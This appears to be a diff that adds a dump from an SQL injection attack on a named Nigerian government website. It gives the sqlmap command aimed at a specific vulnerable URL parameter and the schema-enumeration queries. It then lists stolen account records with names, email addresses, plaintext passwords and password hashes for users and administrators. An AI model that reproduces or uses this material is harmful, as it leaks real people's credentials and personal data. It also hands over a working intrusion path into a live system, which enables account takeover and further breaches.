@@ -1,0 +1,25 @@
+nbrrigov_123
+
+select group_concat(table_name) from information_schema.tables where table_schema = 'nbrrigov_123':
+annce,announcementt,anny,article,category,comments,country,doctype,document,enquiry,events,eventtype,gallery,gendata,ggcat,hardtechn,lga,link,login,login_copy,mail,menu,menugroup,nbrrireports,news,page,page_copy,parameter,role,states,userdata,userlogin
+
+select group_concat(column_name) from information_schema.columns where table_name = 'userlogin':    'ID,Username,Password'
+
+select * from userlogin
+[*] 0, xdayox, dayo
+[*] 1, zuwvmuc3, admin_nsiwc
+
+
+sqlmap -u "http://www.nbrri.gov.ng/sites/news.php?ID=57" --sql-shell --random-agent
+select * from login [11]:
+[*] 2, User, v4ukv6h4nrn3nykbsey4m41c, ojo@nsiwc.gov.ng, ojo, 0xa6ba18356a193f2e, ojo
+[*] 3, Admin, VHOFORU4SRFFU5TU, e_josseph@yahoo.com, Emmanuel Joseph, 0xd5504c42e34b6802, ejoseph
+[*] 4, User,  , hrowlands@sec.gov.ng, henry rowlands, 0xf1cb26aef1432520, hrowlands
+[*] 5, User, VHOFORU4SRFFU5TU, ope@ope.com, ope, emrebaba, opeyemi
+[*] 6, User,  , alf@afafag.com, alfred ako, emrebaba, alfred
+[*] 7, Admin, 9we6mqc3fyzt4sm9qqwqn121, clementyari@yahoo.com, clement, 0x5101be7b82791614, clement
+[*] 8, Admin, l10bu46qrzlbubll, ponwualu@yahoo.com, peteronwualu, 0x72058f0c85ed4dfef95d203f81c5284b, peteronwualu
+[*] 9, User, v4ukv6h4nrn3nykbsey4mgtf, akabsuc@gmail.com, Uchenna, 0x108ad2e98fa5335d, nbrriadmin
+[*] 10, Admin, v4ukv6h4nrn3nykbsey4mgtfhh, webprince64@yahoo.com, Admin, e10adc3949ba59abbe56e057f20f883e, nbrrilog
+[*] 11, Admin,  , webprince644@gmail.com, 111111, 96e79218965eb72c92a549dd5a330112, dayoxx
+[*] 20, Admin,  , webprince64@gmail.com, Administrator, jabi232#, adminnbrri
